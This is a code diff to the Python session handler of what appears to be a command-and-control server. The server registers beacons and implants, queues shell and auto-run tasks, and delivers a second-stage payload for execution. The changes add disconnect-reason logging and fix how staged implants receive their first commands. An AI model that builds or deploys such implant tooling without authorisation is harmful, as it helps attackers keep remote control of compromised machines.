@@ -52,6 +52,9 @@ class BeaconSession:
         self._dispatcher = dispatcher  # 结果处理器续传 + auto_commands 用
         self._client_id = ""           # 注册成功后填充（close 清 active 用）
         self._is_fork = False          # 注册时标记（跳过 auto_commands）
+        # 本周期结束原因(R22):normal / peer_closed / invalid_message /
+        # send_failed / replay_failed —— 离开时随 disconnect 事件一起记录
+        self._end_reason = "normal"
         # 任务在途登记: task_id -> (result_processor, proc_arg)。
         # TCP 批量下发即出队,结果在**后续连接**回来——登记表必须跨会话
         # (server 级共享,挂在 mgr 上;与 HTTPS/DNS 无状态通道的 InFlight
@@ -74,7 +77,13 @@ class BeaconSession:
             client_id, is_new = self._register(reg)
             self._client_id = client_id
             send_welcome(self._sock, self._key)
-            self._task_cycle(client_id, is_new)
+            try:
+                self._task_cycle(client_id, is_new)
+            finally:
+                # R22:无论如何离开(正常跑完/收帧断开/非法消息/发送失败/回放失败)
+                # 都记一笔 disconnect(带原因),且只记一次 —— 此前只有顺利跑完才记,
+                # 事件文件里时间线是断的。未注册的连接不记(见 _emit_end)。
+                self._emit_end()
         except SessionError as e:
             logger.warning("handshake failed: %s", e.message)
             send_error(self._sock, self._key, e.code, e.message)
@@ -94,6 +103,17 @@ class BeaconSession:
         if rec:
             rec.active = max(0, rec.active - 1)
 
+    def _emit_end(self) -> None:
+        """会话收尾:已注册才记 disconnect(带 R22 结束原因)。
+
+        未注册成功的连接(端口扫描、握手失败)绝不能发这条事件 —— 否则事件流里
+        会塞满探测垃圾;这也是收尾放在 _task_cycle 之后而非 run() 外层的原因。
+        """
+        if not self._client_id:
+            return
+        self._events.emit(EVT_DISCONNECT, self._client_id,
+                          reason=self._end_reason)
+
     # ── 主流程 ──
 
     def _register(self, reg: dict) -> tuple:
@@ -110,11 +130,17 @@ class BeaconSession:
                 raw = recv_frame(self._sock, self._key,
                                  max_frame_size=self._config.max_frame_size)
             except (ConnectionError, ValueError):
+                self._end_reason = "peer_closed"
                 return  # 结果收到几条算几条（fire-and-forget,下次重发去重）
             result = json.loads(raw.decode("utf-8"))
             if validate_message(result):
+                # R32:非 dict 载荷(如 `[]`)时原来这里直接 result.get("type") →
+                # AttributeError 打死整个会话(外层 except 只留一行 traceback)。
+                # validate_message 判非法是对的,是日志这行假设了 dict。
+                mtype = result.get("type") if isinstance(result, dict) else type(result).__name__
                 logger.warning("beacon %s sent invalid message: %s",
-                               client_id[:8], result.get("type"))
+                               client_id[:8], mtype)
+                self._end_reason = "invalid_message"
                 return
             mtype = result.get("type")
             if mtype == RESULT:
@@ -135,30 +161,48 @@ class BeaconSession:
                                            "acked": [result.get("task_id", "")]})
                                .encode("utf-8"), self._key)
                 except Exception:
+                    self._end_reason = "send_failed"
                     return
             elif mtype == FETCH:
                 break  # 结果收完,开始下发
             else:
                 logger.warning("beacon %s sent non-result during batch: %s",
                                client_id[:8], mtype)
+                self._end_reason = "invalid_message"
                 return
 
-        # ② 首次上线: auto_commands 全量入队（随批量一起下发,FIFO 在前）
-        if is_new and not self._is_fork:
-            for task in build_auto_tasks(self._config.auto_commands,
-                                         client_id, self._dispatcher):
-                self._tq.push(client_id, task)
-                self._events.emit(EVT_AUTO_CMD_SENT, client_id,
-                                  task_id=task.task_id)
-            # 分段载荷: stage_code(第二段)随首次下发——引导代码(agent_stager)
-            # 注册后收到 init 任务即 exec, 之后真植入物以同 id 继续注册
-            if self._config.stage_code:
-                from server.task_queue import Task
-                self._tq.push(client_id, Task(
-                    code=self._config.stage_code, is_init=True,
-                    task_id="stage"))
-                self._events.emit(EVT_AUTO_CMD_SENT, client_id,
-                                  task_id="stage")
+        # ② 首次上线自动命令。
+        #    - 无分段载荷:is_new 时全量入队(随批量一起下发,FIFO 在前)。
+        #    - 有分段载荷(stage_code):**只下发第二段 init 任务**,auto_commands
+        #      延后到真身(第二段执行后)上线时的第一次注册补发——引导段代码
+        #      只 exec init 任务,同批的其它任务会被直接丢弃,且真身以同 id 再
+        #      注册时 is_new=False,永不补发(2026-09-15 修复)。
+        if not self._is_fork:
+            rec = self._mgr.get_client(client_id)
+            if is_new:
+                if self._config.stage_code:
+                    from server.task_queue import Task
+                    self._tq.push(client_id, Task(
+                        code=self._config.stage_code, is_init=True,
+                        task_id="stage"))
+                    self._events.emit(EVT_AUTO_CMD_SENT, client_id,
+                                      task_id="stage")
+                    if rec is not None:
+                        rec.auto_pending = True   # 待真身上线补发
+                else:
+                    for task in build_auto_tasks(self._config.auto_commands,
+                                                 client_id, self._dispatcher):
+                        self._tq.push(client_id, task)
+                        self._events.emit(EVT_AUTO_CMD_SENT, client_id,
+                                          task_id=task.task_id)
+            elif rec is not None and getattr(rec, "auto_pending", False):
+                # 真身已上线(第二段执行完成):补发首次上线自动命令
+                rec.auto_pending = False
+                for task in build_auto_tasks(self._config.auto_commands,
+                                             client_id, self._dispatcher):
+                    self._tq.push(client_id, task)
+                    self._events.emit(EVT_AUTO_CMD_SENT, client_id,
+                                      task_id=task.task_id)
 
         # ③ 每次会话只取一批(单帧字节预算),剩余任务留在队列、下次回连再取。
         # 旧实现 drain 全量 + 拆多帧:无状态中继(agent_http/https/dns 的
@@ -168,8 +212,6 @@ class BeaconSession:
         budget = max(4096, int(self._config.max_frame_size * 0.8))
         tasks = take_task_batch(client_id, self._tq, budget)
         if tasks:
-            for t in tasks:
-                self._inflight.track(t, client_id)  # 用原 Task 对象登记处理器(含 proc_arg)
             frame = batch_response(acked, tasks, budget)[0]  # 单批 → 单帧
             try:
                 send_frame(self._sock,
@@ -195,7 +237,13 @@ class BeaconSession:
                             "task %s 回放入队失败(队列满), 任务将丢失——"
                             "请等待 beacon 消化后重新下发", 
                             getattr(t, "task_id", "?")[:8])
+                self._end_reason = "replay_failed"
                 return
+            # R22:登记在途必须发生在"真的发出去"之后 —— 此前先登记再发送,
+            # 发送失败走回放分支时登记没撤,留下"其实没交出去"的幽灵记录
+            # (beacon 超时清理会兜底清掉,但语义不对)
+            for t in tasks:
+                self._inflight.track(t, client_id)
             for t in tasks:
                 self._events.emit(EVT_TASK_SENT, client_id, task_id=t.task_id)
             # shell 文本任务 exit/break 已确认下发: 立即复位 is_shell,
@@ -212,6 +260,7 @@ class BeaconSession:
                                        "acked": list(acked)}).encode("utf-8"),
                            self._key)
             except Exception:
+                self._end_reason = "send_failed"
                 return
 
         # ④ 结束本周期（implant 断开,本地执行任务）
@@ -220,4 +269,4 @@ class BeaconSession:
                        json.dumps({"type": PONG}).encode("utf-8"), self._key)
         except Exception:
             pass
-        self._events.emit(EVT_DISCONNECT, client_id)
+        # disconnect 由 run() 的 finally 统一发出(带 reason),这里不再重复发
